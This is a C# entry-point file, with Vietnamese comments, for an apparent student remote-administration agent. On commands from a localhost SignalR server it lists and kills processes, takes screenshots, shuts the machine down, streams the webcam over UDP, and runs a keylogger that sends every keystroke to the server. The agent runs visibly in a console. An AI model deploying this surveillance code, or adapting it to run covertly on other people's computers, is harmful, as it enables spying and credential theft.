// -----------------------------------------------------------------------------
// File: Program.cs
// Role: Điểm khởi chạy chính (Entry Point) của Agent.
//
// Nhiệm vụ:
//      1. Khởi tạo và kết nối các dịch vụ (SignalR, System, App, Cam...).
//      2. Lắng nghe lệnh từ Server thông qua SignalR.
//      3. Điều phối luồng dữ liệu (UDP Stream cho Webcam, JSON cho lệnh).
// -----------------------------------------------------------------------------

using RCS.Agent.Services;
using RCS.Agent.Services.Windows;
using RCS.Common.Models;
using RCS.Common.Protocols;
using System;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace RCS.Agent
{
    class Program
    {
        #region --- CONFIGURATION (CẤU HÌNH HỆ THỐNG) ---

        // Thông tin định danh và kết nối SignalR
        private const string AGENT_ID = "Agent_12345";
        private const string SERVER_URL = "http://localhost:5000/agenthub";

        // Cấu hình UDP Streaming (Gửi video)
        private const string SERVER_UDP_HOST = "localhost";
        private const int SERVER_UDP_PORT = 6000;
        private const int MAX_PACKET_SIZE = 45000; // Kích thước gói tin tối đa (MTU Safe ~65k, để 45k cho an toàn)

        // Cấu hình FPS (Frame Per Second) cho Webcam
        public const int FRAME_PER_SECOND = 60;
        public const int SECOND_PER_FRAME = 1000 / FRAME_PER_SECOND; // ~16ms mỗi frame

        #endregion

        #region --- SERVICES & STATE (DỊCH VỤ & BIẾN TRẠNG THÁI) ---

        // Các Service quản lý chức năng cụ thể
        private static SignalRClient _signalRClient;
        private static ApplicationManager _appManager;
        private static ProcessMonitor _processMonitor;
        private static SystemControl _systemControl;
        private static MediaCapture _mediaCapture;
        private static Keylogger _keylogger;

        // Biến phục vụ Streaming
        private static CancellationTokenSource _webcamCts; // Token để hủy luồng quay video
        private static UdpClient _udpClient;               // Client gửi dữ liệu qua UDP
        private static int _frameSequence = 0;             // ID của khung hình (tăng dần)

        #endregion

        #region --- MAIN ENTRY POINT (KHỞI CHẠY) ---

        static async Task Main(string[] args)
        {
            Console.Title = $"RCS Agent - {AGENT_ID}";

            // 1. Khởi tạo tất cả các dịch vụ
            InitializeServices();

            // 2. Kết nối tới Server điều khiển
            await _signalRClient.ConnectAsync(AGENT_ID);

            Console.WriteLine("Agent is running. Press CTRL+C to exit.");

            // 3. Giữ ứng dụng chạy vô hạn (tránh việc Main thoát ngay lập tức)
            await Task.Delay(-1);
        }

        private static void InitializeServices()
        {
            // Khởi tạo các instance
            _appManager = new ApplicationManager();
            _processMonitor = new ProcessMonitor();
            _systemControl = new SystemControl();
            _mediaCapture = new MediaCapture();
            _keylogger = new Keylogger();
            _udpClient = new UdpClient();

            // Khởi tạo SignalR và đăng ký sự kiện nhận lệnh
            _signalRClient = new SignalRClient(SERVER_URL);
            _signalRClient.OnCommandReceived += HandleCommand;
        }

        #endregion

        #region --- COMMAND HANDLING (XỬ LÝ LỆNH TỪ SERVER) ---

        /// <summary>
        /// Hàm trung tâm xử lý mọi lệnh nhận được từ SignalR.
        /// </summary>
        private static async Task HandleCommand(CommandMessage cmd)
        {
            Console.WriteLine($"[Command] {cmd.Action}");
            try
            {
                switch (cmd.Action)
                {
                    // --- NHÓM 1: ỨNG DỤNG (APPS) ---
                    case ProtocolConstants.ActionAppList:
                        await SendResponse(cmd.Action, _appManager.GetInstalledApps());
                        break;
                    case ProtocolConstants.ActionAppStart:
                        _appManager.StartApp(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "started");
                        break;
                    case ProtocolConstants.ActionAppStop:
                        _appManager.StopApp(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "stopped");
                        break;

                    // --- NHÓM 2: TIẾN TRÌNH (PROCESSES) ---
                    case ProtocolConstants.ActionProcessList:
                        await SendResponse(cmd.Action, _processMonitor.GetProcesses());
                        break;
                    case ProtocolConstants.ActionProcessStart:
                        _processMonitor.StartProcess(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "started");
                        break;
                    case ProtocolConstants.ActionProcessStop:
                        if (int.TryParse(GetParam(cmd, "pid"), out int pid))
                        {
                            _processMonitor.KillProcess(pid);
                        }
                        await SendResponse(cmd.Action, "killed");
                        break;

                    // --- NHÓM 3: HỆ THỐNG (SYSTEM & SCREENSHOT) ---
                    case ProtocolConstants.ActionScreenshot:
                        // Chụp màn hình và gửi trực tiếp dạng Base64 qua SignalR (không qua UDP)
                        await _signalRClient.SendBinaryAsync(_mediaCapture.CaptureScreenBase64());
                        break;
                    case ProtocolConstants.ActionShutdown:
                        _systemControl.Shutdown();
                        break;
                    case ProtocolConstants.ActionRestart:
                        _systemControl.Restart();
                        break;

                    // --- NHÓM 4: KEYLOGGER ---
                    case ProtocolConstants.ActionKeyloggerStart:
                        // Start nhận callback mỗi khi phím được nhấn -> Gửi ngay về server
                        _keylogger.Start(async (key) => 
                        { 
                            await _signalRClient.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key }); 
                        });
                        break;
                    case ProtocolConstants.ActionKeyloggerStop:
                        _keylogger.Stop();
                        await SendResponse(cmd.Action, "stopped");
                        break;

                    // --- NHÓM 5: WEBCAM STREAMING (UDP) ---
                    case ProtocolConstants.ActionWebcamOn:
                        if (_webcamCts == null)
                        {
                            _webcamCts = new CancellationTokenSource();
                            // Chạy vòng lặp stream trên một Task riêng biệt
                            _ = Task.Run(async () => await StreamWebcamLoop(_webcamCts.Token));
                        }
                        break;

                    case ProtocolConstants.ActionWebcamOff:
                        // 1. Hủy token để thoát vòng lặp streaming
                        _webcamCts?.Cancel();
                        _webcamCts = null;

                        // 2. Cưỡng chế tắt Camera ngay lập tức để đèn webcam tắt
                        _mediaCapture.StopWebcam();
                        
                        Console.WriteLine("[Webcam] Force stopped.");
                        await SendResponse(cmd.Action, "stopped");
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing command {cmd.Action}: {ex.Message}");
            }
        }

        #endregion

        #region --- UDP STREAMING LOGIC (LUỒNG GỬI VIDEO) ---

        /// <summary>
        /// Vòng lặp liên tục lấy ảnh từ Webcam và gửi qua UDP.
        /// </summary>
        private static async Task StreamWebcamLoop(CancellationToken token)
        {
            Console.WriteLine("[Webcam] UDP High Quality Stream started...");

            // Bật Camera, nếu thất bại thì thoát luôn
            if (!_mediaCapture.StartWebcam()) return;

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // 1. Lấy dữ liệu ảnh JPEG dạng byte array
                    byte[] imageBytes = _mediaCapture.GetWebcamFrameBytes();

                    if (imageBytes != null && imageBytes.Length > 0)
                    {
                        // 2. Chia nhỏ và gửi qua UDP
                        await SendFragmentedImage(imageBytes);
                    }

                    // 3. Nghỉ một chút để giữ FPS ổn định (không chiếm 100% CPU)
                    await Task.Delay(SECOND_PER_FRAME, token);
                }
                catch (TaskCanceledException) { break; } // Thoát êm khi bấm Stop
                catch (ObjectDisposedException) { break; }
                catch (Exception ex)
                {
                    if (!token.IsCancellationRequested)
                        Console.WriteLine($"[Stream Error] {ex.Message}");
                }
            }

            // Đảm bảo tắt camera lần cuối khi thoát vòng lặp
            _mediaCapture.StopWebcam();
        }

        /// <summary>
        /// Chia file ảnh lớn thành các gói tin nhỏ (Fragmentation) để gửi qua UDP.
        /// </summary>
        private static async Task SendFragmentedImage(byte[] imageBytes)
        {
            try
            {
                // Lấy thời gian hiện tại (dùng để đồng bộ frame bên Client)
                long timestamp = DateTime.UtcNow.Ticks;
                int totalLength = imageBytes.Length;

                // Tính toán số lượng gói tin cần chia
                ushort totalPackets = (ushort)Math.Ceiling((double)totalLength / MAX_PACKET_SIZE);
                
                // Tăng ID frame lên 1 (Thread-safe)
                int frameId = Interlocked.Increment(ref _frameSequence);

                const int HEADER_SIZE = 20;

                for (ushort i = 0; i < totalPackets; i++)
                {
                    int offset = i * MAX_PACKET_SIZE;
                    // Kích thước gói này (gói cuối cùng có thể nhỏ hơn MAX_PACKET_SIZE)
                    int size = Math.Min(MAX_PACKET_SIZE, totalLength - offset);

                    // --- CẤU TRÚC HEADER (20 Bytes) ---
                    // [0-3]: Frame ID (Int32) - Để biết gói này thuộc bức ảnh nào
                    // [4-5]: Packet Index (UInt16) - Số thứ tự gói
                    // [6-7]: Total Packets (UInt16) - Tổng số gói của bức ảnh
                    // [8-11]: Payload Size (Int32) - Kích thước dữ liệu ảnh trong gói này
                    // [12-19]: Timestamp (Int64) - Thời gian chụp
                    byte[] header = new byte[HEADER_SIZE];
                    BitConverter.GetBytes(frameId).CopyTo(header, 0);
                    BitConverter.GetBytes(i).CopyTo(header, 4);
                    BitConverter.GetBytes(totalPackets).CopyTo(header, 6);
                    BitConverter.GetBytes(size).CopyTo(header, 8);
                    BitConverter.GetBytes(timestamp).CopyTo(header, 12);

                    // Ghép Header + Data
                    byte[] packet = new byte[HEADER_SIZE + size];
                    Array.Copy(header, 0, packet, 0, HEADER_SIZE);
                    Array.Copy(imageBytes, offset, packet, HEADER_SIZE, size);

                    // Gửi gói tin đi
                    await _udpClient.SendAsync(packet, packet.Length, SERVER_UDP_HOST, SERVER_UDP_PORT);
                }
            }
            catch { }
        }

        #endregion

        #region --- HELPER METHODS ---

        /// <summary>
        /// Gửi phản hồi nhanh về Server thông qua SignalR.
        /// </summary>
        private static async Task SendResponse(string action, object data)
        {
            await _signalRClient.SendResponseAsync(new ResponseMessage 
            { 
                Action = action, 
                Response = data 
            });
        }

        /// <summary>
        /// Trích xuất tham số từ CommandMessage (Hỗ trợ cả JSON object và String thông thường).
        /// </summary>
        private static string GetParam(CommandMessage cmd, string key)
        {
            if (cmd.Params == null) return "";

            try
            {
                // Trường hợp 1: Params là JsonElement (System.Text.Json)
                if (cmd.Params is System.Text.Json.JsonElement jsonElement)
                {
                    if (jsonElement.TryGetProperty(key, out var value)) 
                        return value.ToString();
                }

                // Trường hợp 2: Params là String (Parse thủ công)
                var str = cmd.Params.ToString();
                if (str.Contains(key))
                {
                    // Cắt chuỗi dựa trên ký tự phân cách
                    var parts = str.Split(new[] { key, ":" }, StringSplitOptions.RemoveEmptyEntries);
                    
                    for (int i = 0; i < parts.Length; i++)
                    {
                        // Tìm giá trị nằm ngay sau key
                        if (parts[i].Contains(key) && i + 1 < parts.Length)
                        {
                            return CleanString(parts[i + 1]);
                        }
                    }
                    
                    // Fallback đơn giản
                    if (parts.Length > 1) 
                        return CleanString(parts[1]);
                }
            }
            catch { }
            return "";
        }

        // Hàm phụ làm sạch chuỗi (xóa ngoặc, nháy kép, khoảng trắng)
        private static string CleanString(string input)
        {
            return input.Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
        }

        #endregion
    }
}